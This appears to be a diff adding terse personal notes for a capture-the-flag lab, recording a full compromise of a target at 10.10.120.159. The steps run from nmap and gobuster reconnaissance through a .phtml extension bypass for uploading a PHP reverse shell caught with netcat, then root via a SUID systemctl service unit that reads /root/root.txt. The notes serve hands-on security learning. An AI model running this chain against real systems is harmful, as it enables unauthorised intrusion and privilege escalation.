@@ -1,0 +1,34 @@
+scaning
+nmap -A -p 21,22,139,445,3128,3333 -T4 10.10.120.159
+
+fiding hidden path on HTTP
+gobuster dir -u http://10.10.120.159:3333 -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt
+=> found /internal/ on HTTP
+
+using BurpSuite to intercept the upload process => try to upload a file to see the response => Extension not allowed
+As the web write with php => can try other php file type like php3, php4,php5, phtml => sent the POST request to instruder module on burp => Add the .php as position => add the possible file type into the payloads => sniper attack
+
+The result for phtml will be different vs other => success => can use a php reverse shell
+Downloading a php reverse shell and change the IP address (your tunnel IP) and port to 1234 (just to match with the nc command)
+=> upload to the server => can try use gobuster to dig for the hidden dir in internal/ => found uploads 
+netcat the connection: nc -lvnp 1234
+=> run the uploaded reverse shell on webbrowser (netcat the connection first) => got access to the shell as www-data user
+=> cd home to find the user and user flag
+
+using SUID misconfig to PE 
+search for SUID file with:
+find / -type f -perm -4000 -user root -exec ls -l {} \;
+=> found /bin/systemctl that can exploit on GTFOBins
+
+cd into /bin
+run line by line:
+TF=$(mktemp).service
+echo '[Service]
+Type=oneshot
+ExecStart=/bin/sh -c "cat /root/root.txt > /tmp/output"
+[Install]
+WantedBy=multi-user.target' > $TF
+./systemctl link $TF
+./systemctl enable --now $TF
+
+=> the root flag should be in the /tmp/output file
